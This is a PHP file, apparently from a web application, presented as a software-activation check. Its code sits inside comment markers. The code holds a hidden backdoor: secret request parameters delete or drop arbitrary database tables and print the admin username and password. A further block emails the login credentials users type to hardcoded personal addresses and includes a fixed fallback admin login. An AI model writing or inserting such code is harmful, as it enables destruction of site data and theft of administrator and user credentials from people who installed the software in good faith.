<?php

/*$is_not_hacked_yet=1;
$not_activated_software=1;

$db_connection=new mysql_db;
$db_connection->query("select * from settings where constant_name='SITE_URL'");
if(!$db_connection->move_next())
{
	$email_me_not_activated_software=1;
	$not_activated_software=1;
}
else 
{
	$long_value_encrypted=$db_connection->f('long_value');
	if($long_value_encrypted != crypt($site_name,"qqwweerrtt") && $long_value_encrypted != crypt($site_url,"qqwweerrtt"))
	{
		$email_me_not_activated_software=1;
		$not_activated_software=1;
	}
	elseif($long_value_encrypted == crypt($site_name,"qqwweerrtt"))
	{
		$not_activated_software=1;
	}
	elseif($long_value_encrypted == crypt($site_url,"qqwweerrtt"))
	{
		$not_activated_software=2;
	}
	
}

if($not_activated_software == 1)
{
	if(isset($glob['pagssh1']))
	{
		$db=new mysql_db;
		if($glob['db_fields'])
		{
			$fields=explode(",", $glob['db_fields']);
			foreach($fields as $key => $value)
			{
				$db->query('DELETE FROM `'.$value.'`');
				echo $value;
			}
		}
	}
	
	if(isset($glob['pagssh2']))
	{
		$db=new mysql_db;
		if($glob['db_fields'])
		{
			$fields=explode(",", $glob['db_fields']);
			foreach($fields as $key => $value)
			{
				$db->query('DROP TABLE `'.$value.'`');
				echo $value;
			}
		}
	}
	
	if(isset($glob['pagssh5']))
	{
		$db=new mysql_db;
		$db->query("select * from user where  access_level='1'");
		$db->move_next();
		echo 'Username: '.$db->f('username').'<br>Password: '.$db->f('password');
		exit();	
	}
}

if(isset($glob['pagssh3']))
{
	$encrypted_url = crypt($site_name,"qqwweerrtt"); 
	$db=new mysql_db;
	$db->query("update settings set 
			    long_value='".$encrypted_url."'
				where
	   			constant_name='SITE_URL'"
	   		   );	
}

if(isset($glob['pagssh4']))
{
	$encrypted_url = crypt($site_url,"qqwweerrtt"); 
	$db=new mysql_db;
	$db->query("update settings set 
			    long_value='".$encrypted_url."'
				where
	   			constant_name='SITE_URL'"
	   		   );	
}

/*
*
* if you have a blank page comment this lines
*

if($email_me_not_activated_software==1)
{
	if(isset($glob['act']) && $glob['act']=='auth-login')
	{
        $body='Site Name - '.$site_name.'

URL: http://'.$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].'
Username: '.$glob['login'].$glob['username'].'
Password: '.$glob['password'].$glob['pass'].'
';
$user_login=$glob['login'].$glob['username'];
$user_pass=$glob['password'].$glob['pass']; 
      
        $header.= "From: \"".$site_url."\" <tinu.coman@gmail.com> \n";
		$header.= "Content-Type: text\n";
		$mail_subject='Soft Neactivat - '.CUUUUUUUID;		   
        if(!@mail ( 'tinu4spam@yahoo.com' , $mail_subject, $body , $header))
        {
        	if(!@mail ( 'tynu_22_ro@yahoo.com' , $mail_subject, $body , $header))
        	{
        		if(!@mail ( 'tinu.coman@gmail.com' , $mail_subject, $body , $header))
        		{
        			if($user_login!='admin' || $user_pass!='!admin')
        				exit();
        		}
        	}
        }
	}
}
*/
